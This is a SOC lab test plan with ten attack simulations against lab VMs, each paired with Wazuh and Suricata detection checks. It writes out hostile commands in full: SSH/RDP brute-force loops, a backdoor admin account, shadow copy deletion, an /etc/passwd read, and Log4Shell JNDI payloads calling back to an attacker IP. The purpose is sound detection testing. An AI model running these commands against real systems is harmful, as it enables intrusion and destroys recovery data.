# Testing & Validation Scenarios — Advanced SOC Lab

Structured test cases confirming the full detection-response pipeline works
end to end. Each scenario has: preconditions, execution steps, expected
detection, pass/fail criteria, and rollback instructions.

Run these in order — they build on each other. Complete the
[`verification_checks.md`](../04_SIEM_Deployment/verification_checks.md)
prerequisite first.

---

## How to Use This Document
Read preconditions
Execute attack commands (from 15_Attack_Simulation/kali_attack_commands.md)
Wait the stated detection window
Run the validation query
Record PASS / FAIL in the checklist column
Execute rollback before next scenario
Time budget: ~3 hours for all 10 scenarios end to end.

---

## Scenario 01 — SSH Brute Force Detection

| Field | Value |
|---|---|
| **MITRE Technique** | T1110.001 — Brute Force: Password Guessing |
| **Target** | `ubuntu-webserver` (192.168.56.40) — port 22 |
| **Source** | Kali attacker (192.168.56.20) |
| **Expected Wazuh Rule** | `100001` (level 10) |
| **Expected Suricata SID** | `9000002` |
| **Detection window** | < 60 seconds from first failed login |

**Preconditions:**
- SSH service running on 192.168.56.40
- Wazuh agent active on ubuntu-webserver
- `sshpass` installed on Kali: `sudo apt-get install -y sshpass`

**Execute:**
```bash
# From Kali VM
for i in $(seq 1 15); do
  sshpass -p "wrong$i" ssh -o StrictHostKeyChecking=no \
    -o ConnectTimeout=2 testuser@192.168.56.40 2>/dev/null
done
```

**Validate:**
```bash
# On SIEM server
curl -sk -u admin:SecretPassword1! \
  "https://localhost:9200/wazuh-alerts-*/_search?q=rule.id:100001&size=1&pretty" \
  | python3 -m json.tool | grep -E '"description"|"level"|"timestamp"'
```

**Pass criteria:**
- [ ] Alert with `rule.id: 100001` exists in Elasticsearch
- [ ] `rule.level` is `10`
- [ ] `agent.name` is `ubuntu-webserver`
- [ ] `data.srcip` is `192.168.56.20`
- [ ] TheHive case auto-created by `auto_investigate.py` (if daemon running)

**Rollback:** `sudo fail2ban-client unban 192.168.56.20` (if fail2ban active)

---

## Scenario 02 — Windows RDP Brute Force

| Field | Value |
|---|---|
| **MITRE Technique** | T1110.001 — Brute Force: RDP |
| **Target** | `win10-victim` (192.168.56.30) — port 3389 |
| **Source** | Kali attacker (192.168.56.20) |
| **Expected Wazuh Rule** | `100003` (level 10) |
| **Expected Suricata SID** | `9000004` |
| **Detection window** | < 30 seconds |

**Preconditions:**
- RDP enabled on win10-victim
- `crowbar` installed on Kali: `sudo apt-get install -y crowbar`

**Execute:**
```bash
# From Kali VM
crowbar -b rdp -s 192.168.56.30/32 -u administrator \
  -C /usr/share/seclists/Passwords/Common-Credentials/best110.txt \
  -n 1 2>/dev/null &
sleep 20 && kill %1
```

**Validate:**
```bash
curl -sk -u admin:SecretPassword1! \
  "https://localhost:9200/wazuh-alerts-*/_search?q=rule.id:100003&size=1&pretty" \
  | python3 -m json.tool | grep -E '"description"|"level"'

# Suricata check
sudo grep "9000004" /var/log/suricata/fast.log | tail -3
```

**Pass criteria:**
- [ ] Alert `rule.id: 100003` at level 10 present in Elasticsearch
- [ ] Suricata `fast.log` contains SID `9000004`

---

## Scenario 03 — Nmap Network Scan Detection

| Field | Value |
|---|---|
| **MITRE Technique** | T1046 — Network Service Scanning |
| **Target** | Full lab subnet `192.168.56.0/24` |
| **Source** | Kali attacker (192.168.56.20) |
| **Expected Wazuh Rule** | `100014` (level 8) |
| **Expected Suricata SID** | `9000001` |
| **Detection window** | < 15 seconds |

**Execute:**
```bash
# From Kali VM
sudo nmap -sS -T4 -p 1-1000 192.168.56.0/24
```

**Validate:**
```bash
# Suricata check
sudo grep "Nmap" /var/log/suricata/fast.log | tail -3

# Wazuh check
curl -sk -u admin:SecretPassword1! \
  "https://localhost:9200/wazuh-alerts-*/_search?q=rule.id:100014&size=1&pretty" \
  | python3 -m json.tool | grep '"description"'
```

**Pass criteria:**
- [ ] Suricata `fast.log` contains "SOC-LAB Nmap SYN Scan Detected"
- [ ] Wazuh alert `100014` exists in Elasticsearch within 15 seconds

---

## Scenario 04 — PowerShell Encoded Command Execution

| Field | Value |
|---|---|
| **MITRE Technique** | T1059.001 — Command and Scripting Interpreter: PowerShell |
| **Target** | `win10-victim` (192.168.56.30) — executed locally |
| **Expected Wazuh Rule** | `100005` (level 12) |
| **Sysmon EventID** | 1 (Process Create) |
| **Detection window** | < 10 seconds |

**Preconditions:**
- Sysmon installed with `sysmon_config.xml` on win10-victim
- Wazuh agent active and forwarding Sysmon events

**Execute (on Windows victim — PowerShell as Administrator):**
```powershell
$cmd = 'Write-Host "SOC Lab Test T1059.001"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded
```

**Validate:**
```bash
# On SIEM server
curl -sk -u admin:SecretPassword1! \
  "https://localhost:9200/wazuh-alerts-*/_search?q=rule.id:100005&size=1&pretty" \
  | python3 -m json.tool | grep -E '"description"|"commandLine"'
```

**Pass criteria:**
- [ ] Alert `100005` at level 12 present
- [ ] `win.eventdata.commandLine` field contains `-EncodedCommand`
- [ ] `agent.name` is `win10-victim`

---

## Scenario 05 — Local Administrator Account Creation

| Field | Value |
|---|---|
| **MITRE Techniques** | T1136.001 — Create Local Account + T1098 — Account Manipulation |
| **Target** | `win10-victim` (192.168.56.30) — executed locally |
| **Expected Wazuh Rules** | `100009` (level 14) + `100010` (level 14) |
| **Windows EventIDs** | 4720 (account created) + 4732 (added to Administrators) |
| **Detection window** | < 15 seconds per event |

**Execute (on Windows victim — PowerShell as Administrator):**
```powershell
# Step 1 — Create backdoor account (triggers EventID 4720 → rule 100009)
net user soclabtestuser "S0cL@bTest!" /add /y

# Step 2 — Add to Administrators (triggers EventID 4732 → rule 100010)
net localgroup administrators soclabtestuser /add
```

**Validate:**
```bash
curl -sk -u admin:SecretPassword1! \
  "https://localhost:9200/wazuh-alerts-*/_search" \
  -H "Content-Type: application/json" -d '{
    "query": {"terms": {"rule.id": ["100009","100010"]}},
    "sort": [{"timestamp": {"order": "desc"}}],
    "size": 2
  }' | python3 -m json.tool | grep -E '"id"|"description"'
```

**Pass criteria:**
- [ ] Alert `100009` (EventID 4720 — account created) present
- [ ] Alert `100010` (EventID 4732 — added to Administrators) present
- [ ] Both alerts show `agent.name: win10-victim`

**Rollback:**
```powershell
net user soclabtestuser /delete
```

---

## Scenario 06 — LSASS Credential Dumping (Mimikatz Pattern)

| Field | Value |
|---|---|
| **MITRE Technique** | T1003.001 — OS Credential Dumping: LSASS Memory |
| **Target** | `win10-victim` (192.168.56.30) |
| **Expected Wazuh Rule** | `100013` (level 15 — CRITICAL) |
| **Sysmon EventID** | 10 (ProcessAccess) |
| **Detection window** | < 5 seconds |

**Preconditions:**
- Sysmon installed with `sysmon_config.xml` — EventID 10 must be enabled
- Rule 100013 loaded in Wazuh — confirm with:
  `curl -sk -u admin:SecretPassword1! "https://localhost:9200/wazuh-alerts-*/_search?q=rule.id:100013"`

**Execute (on Windows victim — safe simulation, no actual credential dump):**
```powershell
# Opens a process handle to lsass.exe — sufficient to trigger
# Sysmon EventID 10 and Wazuh rule 100013 without dumping credentials
$lsass = Get-Process lsass
$handle = [System.Diagnostics.Process]::GetProcessById($lsass.Id)
Write-Host "LSASS PID: $($lsass.Id) — Sysmon EventID 10 should fire"
```

**Validate:**
```bash
curl -sk -u admin:SecretPassword1! \
  "https://localhost:9200/wazuh-alerts-*/_search?q=rule.id:100013&size=1&pretty" \
  | python3 -m json.tool | grep -E '"description"|"level"|"grantedAccess"'
```

**Pass criteria:**
- [ ] Alert `100013` at level **15** present — highest severity in the ruleset
- [ ] `rule.description` contains "LSASS" or "Mimikatz"
- [ ] TheHive P1 case auto-created (if `auto_investigate.py` daemon running)

---

## Scenario 07 — Ransomware Pre-Attack: Shadow Copy Deletion

| Field | Value |
|---|---|
| **MITRE Technique** | T1490 — Inhibit System Recovery |
| **Target** | `win10-victim` (192.168.56.30) |
| **Expected Wazuh Rule** | `100012` (level 15 — CRITICAL) |
| **Detection window** | < 10 seconds |

> ⚠️ **Take a VM snapshot BEFORE running this test.**
> `vagrant snapshot save victim pre-ransomware-test`
> Shadow copies **cannot** be recovered once deleted.

**Execute (on Windows victim — cmd.exe as Administrator):**
```cmd
vssadmin.exe delete shadows /all /quiet
```

**Validate:**
```bash
curl -sk -u admin:SecretPassword1! \
  "https://localhost:9200/wazuh-alerts-*/_search?q=rule.id:100012&size=1&pretty" \
  | python3 -m json.tool | grep -E '"description"|"commandLine"'
```

**Pass criteria:**
- [ ] Alert `100012` at level 15 present within 10 seconds
- [ ] `win.eventdata.commandLine` contains `vssadmin` and `delete shadows`

**Rollback:**
```bash
vagrant snapshot restore victim pre-ransomware-test
```

---

## Scenario 08 — Cowrie Honeypot Interaction

| Field | Value |
|---|---|
| **MITRE Technique** | T1110 — Brute Force + T1133 — External Remote Services |
| **Target** | Cowrie honeypot on SIEM server (192.168.56.10:2222) |
| **Source** | Kali attacker (192.168.56.20) |
| **Expected Wazuh Rule** | `100017` (level 14) |
| **Detection window** | < 5 seconds after login |

**Preconditions:**
- Cowrie running: `docker ps | grep cowrie`
- Cowrie `cowrie.json` in Wazuh localfile config

**Execute (from Kali VM):**
```bash
sshpass -p "password" ssh -o StrictHostKeyChecking=no \
  -p 2222 root@192.168.56.10 "whoami; cat /etc/passwd; exit"
```

**Validate:**
```bash
# Confirm Cowrie logged the session
sudo tail -5 /var/log/cowrie/cowrie.json | python3 -m json.tool | grep eventid

# Confirm Wazuh ingested and matched rule 100017
curl -sk -u admin:SecretPassword1! \
  "https://localhost:9200/wazuh-alerts-*/_search?q=rule.id:100017&size=1&pretty" \
  | python3 -m json.tool | grep -E '"description"|"srcip"'
```

**Pass criteria:**
- [ ] `cowrie.login.success` event in `/var/log/cowrie/cowrie.json`
- [ ] Alert `100017` at level 14 present in Elasticsearch
- [ ] `data.srcip` shows `192.168.56.20`

---

## Scenario 09 — Log4Shell Exploitation Attempt

| Field | Value |
|---|---|
| **MITRE Technique** | T1190 — Exploit Public-Facing Application |
| **Target** | `ubuntu-webserver` (192.168.56.40:80) |
| **Source** | Kali attacker (192.168.56.20) |
| **Expected Wazuh Rule** | `100019` (level 15 — CRITICAL) |
| **Detection window** | < 5 seconds |

**Preconditions:**
- Web server is running on 192.168.56.40
- Apache access logs are being ingested by Wazuh agent
- Rule 100019 uses `pcre2` to match `\$\{jndi:(ldap|rmi|dns)://`

**Execute (from Kali VM):**
```bash
# Payload in User-Agent header
curl -s -A '${jndi:ldap://192.168.56.20:1389/exploit}' \
  http://192.168.56.40/

# Payload in custom header
curl -s -H 'X-Api-Version: ${jndi:ldap://192.168.56.20:1389/exploit}' \
  http://192.168.56.40/
```

**Validate:**
```bash
curl -sk -u admin:SecretPassword1! \
  "https://localhost:9200/wazuh-alerts-*/_search?q=rule.id:100019&size=1&pretty" \
  | python3 -m json.tool | grep -E '"description"|"message"'
```

**Pass criteria:**
- [ ] Alert `100019` at level 15 present within 5 seconds
- [ ] Alert message field contains `jndi` or `ldap`
- [ ] `agent.name` is `ubuntu-webserver`

---

## Scenario 10 — Full Pipeline E2E: Alert → Enrich → TheHive Case → Block

| Field | Value |
|---|---|
| **Purpose** | Validate the complete automated SOC response pipeline |
| **Components** | Wazuh → Elasticsearch → `auto_investigate.py` → AbuseIPDB → TheHive → `block_ip.py` |
| **Expected total time** | < 90 seconds end to end |

**Preconditions:**
- `THEHIVE_API_KEY` set in `.env`
- `ABUSEIPDB_API_KEY` set in `.env`
- TheHive reachable at `http://192.168.56.10:9000`
- `auto_investigate.py` not already running

**Execute (all commands run on SIEM server):**
```bash
# Step 1 — Start the auto-investigation daemon
source .env
python3 16_AI_Automation/auto_investigate.py --daemon &
DAEMON_PID=$!
echo "Daemon PID: $DAEMON_PID"

# Step 2 — Trigger SSH brute force from Kali (or simulate locally)
for i in $(seq 1 15); do
  sshpass -p "wrong$i" ssh -o StrictHostKeyChecking=no \
    -o ConnectTimeout=2 testuser@192.168.56.40 2>/dev/null
done
echo "Attack sequence complete"

# Step 3 — Wait for the full pipeline to run
echo "Waiting 90s for pipeline..."
sleep 90

# Step 4 — Confirm Wazuh alert reached Elasticsearch
echo "=== Wazuh Alert Check ==="
curl -sk -u admin:SecretPassword1! \
  "https://localhost:9200/wazuh-alerts-*/_search?q=rule.id:100001&size=1&pretty" \
  | python3 -m json.tool | grep -E '"description"|"level"|"timestamp"'

# Step 5 — Confirm TheHive case was auto-created
echo "=== TheHive Case Check ==="
curl -sf "http://192.168.56.10:9000/api/v1/query" \
  -H "Authorization: Bearer $THEHIVE_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"query":[
    {"_name":"listCase"},
    {"_name":"filter","_like":{"_field":"title","_value":"brute"}},
    {"_name":"page","from":0,"to":5}
  ]}' | python3 -m json.tool | grep -E '"title"|"severity"|"status"'

# Step 6 — Confirm IP block log
echo "=== Block Log Check ==="
python3 16_AI_Automation/block_ip.py --list-blocked

# Step 7 — Stop the daemon
kill $DAEMON_PID
echo "Daemon stopped"
```

**Pass criteria:**
- [ ] Alert `100001` in Elasticsearch within 60 seconds of attack
- [ ] TheHive case with "brute" in title exists and has severity ≥ 2
- [ ] AbuseIPDB enrichment data visible in TheHive case description
- [ ] Attacker IP appears in `block_ip.py --list-blocked` (if AbuseIPDB score ≥ threshold)
- [ ] Daemon ran without Python exceptions in terminal output

---

## Scenario Results Summary Table

Record your results here after running all scenarios:

| # | Scenario | Wazuh Rule | MITRE | Result | MTTD |
|---|---|---|---|---|---|
| 01 | SSH Brute Force | 100001 | T1110.001 | [ ] PASS / [ ] FAIL | ___ min |
| 02 | RDP Brute Force | 100003 | T1110.001 | [ ] PASS / [ ] FAIL | ___ min |
| 03 | Nmap Scan | 100014 | T1046 | [ ] PASS / [ ] FAIL | ___ min |
| 04 | PowerShell Obfuscation | 100005 | T1059.001 | [ ] PASS / [ ] FAIL | ___ min |
| 05 | Account Creation + Privilege Escalation | 100009, 100010 | T1136.001, T1098 | [ ] PASS / [ ] FAIL | ___ min |
| 06 | LSASS Credential Access | 100013 | T1003.001 | [ ] PASS / [ ] FAIL | ___ min |
| 07 | Shadow Copy Deletion | 100012 | T1490 | [ ] PASS / [ ] FAIL | ___ min |
| 08 | Honeypot Interaction | 100017 | T1110 | [ ] PASS / [ ] FAIL | ___ min |
| 09 | Log4Shell Exploitation | 100019 | T1190 | [ ] PASS / [ ] FAIL | ___ min |
| 10 | Full Pipeline E2E | All above | Multiple | [ ] PASS / [ ] FAIL | ___ min |

**Overall detection rate:** ___/10 scenarios detected = ___%

---

## Recording MTTD for KPI Reporting

After completing all scenarios, feed your MTTD values into the
metrics calculator:

```bash
python3 13_SOC_Performance_Metrics/mttr_calculator.py --period 1d --print
```

Industry benchmarks to compare against:

| Severity | MTTD Benchmark | MTTR Benchmark |
|---|---|---|
| Critical (level 15) | ≤ 5 minutes | ≤ 60 minutes |
| High (level 12–14) | ≤ 15 minutes | ≤ 240 minutes |
| Medium (level 8–11) | ≤ 60 minutes | ≤ 480 minutes |
| Low (level 1–7) | ≤ 120 minutes | ≤ 1440 minutes |

Results feed directly into Section 13 of the
[`20_Deliverables/report_template.md`](../20_Deliverables/report_template.md).